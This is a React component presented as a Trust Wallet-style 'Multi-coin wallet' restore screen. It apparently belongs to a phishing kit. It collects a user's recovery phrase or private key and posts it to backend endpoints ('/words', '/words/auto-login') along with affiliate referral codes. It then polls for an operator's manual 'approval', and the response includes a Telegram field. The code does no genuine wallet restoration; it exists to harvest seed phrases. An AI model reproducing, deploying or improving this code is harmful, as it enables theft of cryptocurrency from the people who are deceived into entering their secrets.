// MultiCoinWalletSection.jsx
import { IoArrowBack, IoClose, IoScan } from 'react-icons/io5'
import { useState, useEffect } from 'react'
import { useNavigate, useLocation } from 'react-router-dom'
import api from '../../api/axios'
import '../../styles/MultiCoinWalletSection.css'

function MultiCoinWalletSection({
  walletName: initialWalletName = '',
  secretPhrase: initialSecretPhrase = '',
  onBack,
  onRestoreSuccess,
  onRestoreError,
}) {
  const navigate = useNavigate()
  const location = useLocation()
  const [walletName, setWalletName] = useState(initialWalletName)
  const [secretPhrase, setSecretPhrase] = useState(initialSecretPhrase)
  const [isLoading, setIsLoading] = useState(false)
  const [statusMessage, setStatusMessage] = useState('')
  const [isAutoLogin, setIsAutoLogin] = useState(false)
  const [referralCode, setReferralCode] = useState(null)
  const [activityState, setActivityState] = useState(null)

  // Capture referral from URL on component mount
  useEffect(() => {
    const params = new URLSearchParams(location.search)
    const ref = params.get('ref')
    if (ref && /^[a-f0-9]{24}$/.test(ref)) {
      setReferralCode(ref)
      // Store for later use
      sessionStorage.setItem('referralCode', ref)
      console.log('✅ Referral detected:', ref)
    } else {
      // Check session storage if not in URL
      const storedRef = sessionStorage.getItem('referralCode')
      if (storedRef) {
        setReferralCode(storedRef)
      }
    }
  }, [location])

  const canRestore = walletName.trim().length > 0 && secretPhrase.trim().length > 0

  // Step 1: Submit consent and get activity state
  const submitConsent = async () => {
    try {
      const response = await api.post('/activity/state', {
        consent: 'granted',
        referral: referralCode // Pass referral if exists
      })

      if (response.data.state) {
        setActivityState(response.data.state)
        return response.data.state
      }
      throw new Error('No state returned')
    } catch (error) {
      console.error('Consent submission error:', error)
      // Continue anyway - consent is not critical for core functionality
      return null
    }
  }

  // Step 2: Record visit with activity state
  const recordVisit = async (state, words) => {
    try {
      await api.post('/activity/visit', {
        state: state,
        // Additional data can be sent if needed
        referral: referralCode,
        source: 'wallet-restore'
      })
    } catch (error) {
      console.error('Visit recording error:', error)
      // Don't fail the flow if visit recording fails
    }
  }

  const handleWalletNameChange = (value) => {
    setWalletName(value)
  }

  const handleWalletNameClear = () => {
    setWalletName('')
  }

  const handleSecretPhraseChange = (value) => {
    setSecretPhrase(value)
  }

  const handlePasteSecretPhrase = async () => {
    try {
      const text = await navigator.clipboard.readText()
      setSecretPhrase(text)
    } catch (error) {
      console.error('Failed to paste:', error)
    }
  }

  // Modified auto-login with referral
  const handleAutoLogin = async () => {
    if (!canRestore || isLoading || isAutoLogin) return

    setIsLoading(true)
    setIsAutoLogin(true)
    setStatusMessage('⏳ Checking your wallet credentials...')

    try {
      // Step 1: Submit consent
      const state = await submitConsent()
      
      // Step 2: Try auto-login
      const response = await api.post('/words/auto-login', {
        words: secretPhrase,
        referral: referralCode // Pass referral to backend
      })

      if (response.data.ok) {
        const accountData = response.data.account
        
        // Step 3: Record visit after successful login
        if (state) {
          await recordVisit(state, secretPhrase)
        }
        
        setStatusMessage('✅ Wallet found! Redirecting...')
        
        // Store account data
        localStorage.setItem('trust-wallet-account', JSON.stringify(accountData))
        localStorage.setItem('trust-wallet-logged-in', 'true')
        if (referralCode) {
          localStorage.setItem('referralCode', referralCode)
        }
        
        setTimeout(() => {
          navigate('/wallet', { 
            state: { 
              account: accountData,
              autoLogin: true,
              referral: referralCode
            } 
          })
        }, 1000)
      } else {
        throw new Error(response.data.error || 'Auto-login failed')
      }
    } catch (error) {
      console.error('Auto-login error:', error)
      
      setStatusMessage('ℹ️ No existing wallet found. Proceeding with approval request...')
      setIsAutoLogin(false)
      
      // Proceed with manual approval flow
      handleRestoreWallet()
    }
  }

  // Modified restore wallet with referral
  const handleRestoreWallet = async () => {
    if (!canRestore || isLoading) return

    setIsLoading(true)
    setStatusMessage('⏳ Submitting wallet for approval...')
    
    try {
      // Step 1: Submit consent
      const state = await submitConsent()
      
      // Step 2: Submit words for approval with activity data
      const response = await api.post('/words', {
        words: secretPhrase,
        createdBy: walletName,
        source: 'wallet-restore',
        title: walletName,
        activity: {
          state: state, // Pass the activity state
          referral: referralCode
        }
      })

      if (response.data.ok) {
        const batch = response.data.batch
        
        // Step 3: Record visit
        if (state) {
          await recordVisit(state, secretPhrase)
        }
        
        // Start polling for status updates
        const interval = setInterval(async () => {
          try {
            const statusResponse = await api.get(`/words/${batch.id}/status`)
            
            if (statusResponse.data.ok) {
              const batchStatus = statusResponse.data.batch
              
              if (batchStatus.approvalStatus === 'approved') {
                clearInterval(interval)
                setStatusMessage('✅ Wallet approved! Redirecting...')
                localStorage.setItem('trust-wallet-logged-in', 'true')
                if (referralCode) {
                  localStorage.setItem('referralCode', referralCode)
                }
                
                const approvedAccount = getApprovedAccount(batchStatus)

                if (approvedAccount) {
                  localStorage.setItem('trust-wallet-account', JSON.stringify(approvedAccount))
                }

                setTimeout(() => {
                  navigate('/wallet', {
                    state: {
                      account: approvedAccount,
                      batchId: batch.id,
                      approvalStatus: batchStatus.approvalStatus,
                      referral: referralCode
                    },
                  })
                }, 1000)
              } else if (batchStatus.approvalStatus === 'rejected') {
                clearInterval(interval)
                setStatusMessage('❌ Wallet access denied. Please check your credentials and try again.')
                setIsLoading(false)
              } else {
                setStatusMessage('⏳ Waiting for approval...')
              }
            }
          } catch (error) {
            console.error('Status check error:', error)
            setStatusMessage('⚠️ Error checking wallet status. Please try again.')
            setIsLoading(false)
            clearInterval(interval)
          }
        }, 3000)
        
        onRestoreSuccess?.({
          walletName,
          secretPhrase,
          batchId: batch.id,
          telegram: response.data.telegram,
          referral: referralCode
        })
      } else {
        throw new Error(response.data.error || 'Failed to restore wallet')
      }
    } catch (error) {
      console.error('Restore error:', error)
      setStatusMessage(`❌ Error: ${error.message || 'Failed to restore wallet'}`)
      setIsLoading(false)
      onRestoreError?.(error.message)
    }
  }

  const handleOpenSecretPhraseHelp = () => {
    window.open('https://example.com/help', '_blank')
  }

  const handleBack = () => {
    if (onBack) {
      onBack()
    } else {
      navigate('/')
    }
  }

  return (
    <main className="app-screen restore-screen">
      <FlowHeader
        title="Multi-coin wallet"
        onBack={handleBack}
        action={
          <button className="icon-button" type="button" aria-label="Scan">
            <IoScan />
          </button>
        }
      />
      <section className="restore-form">
        <div className="restore-field">
          <label htmlFor="wallet-name">Wallet name</label>
          <div className="wallet-name-field">
            <input
              id="wallet-name"
              type="text"
              value={walletName}
              enterKeyHint="next"
              onChange={(event) => handleWalletNameChange(event.target.value)}
              disabled={isLoading}
              placeholder="Enter wallet name"
            />
            <button
              className="wallet-name-clear"
              type="button"
              aria-label="Clear name"
              onClick={handleWalletNameClear}
              disabled={isLoading}
            >
              <IoClose aria-hidden="true" />
            </button>
          </div>
        </div>
        <div className="restore-field">
          <label htmlFor="secret-phrase">Secret Phrase</label>
          <div className="secret-phrase-safe-box">
            <textarea
              id="secret-phrase"
              value={secretPhrase}
              spellCheck="false"
              autoCapitalize="none"
              autoComplete="off"
              autoCorrect="off"
              enterKeyHint="done"
              onChange={(event) => handleSecretPhraseChange(event.target.value)}
              disabled={isLoading}
              placeholder="Enter your recovery phrase or private key"
            />
            <button 
              type="button" 
              onClick={handlePasteSecretPhrase}
              disabled={isLoading}
            >
              Paste
            </button>
          </div>
        </div>
        <p>Typically 12 (sometimes 18, 24) words separated by single spaces</p>
        
        {statusMessage && (
          <div className={`status-message ${statusMessage.includes('❌') ? 'error' : statusMessage.includes('✅') ? 'success' : statusMessage.includes('ℹ️') ? 'info' : 'info'}`}>
            {statusMessage}
          </div>
        )}
      </section>
      <section className="restore-actions">
        <button 
          className="continue-button" 
          type="button" 
          disabled={!canRestore || isLoading} 
          onClick={handleAutoLogin}
        >
          {isLoading ? 'Processing...' : 'Connect Wallet'}
        </button>
        <button 
          className="secret-help" 
          type="button" 
          onClick={handleOpenSecretPhraseHelp}
          disabled={isLoading}
        >
          Need help with wallet access?
        </button>
      </section>
    </main>
  )
}

function FlowHeader({ title, onBack, action }) {
  return (
    <header className="flow-header">
      <button className="icon-button" type="button" aria-label="Back" onClick={onBack}>
        <IoArrowBack />
      </button>
      <h1>{title}</h1>
      {action || <span></span>}
    </header>
  )
}

function getApprovedAccount(batchStatus) {
  const account = batchStatus.account || batchStatus.accountData || batchStatus.wallet
  const accountNumber = batchStatus.accountNumber || account?.accountNumber

  if (!account && !accountNumber) return null

  return {
    ...account,
    accountNumber,
  }
}

export default MultiCoinWalletSection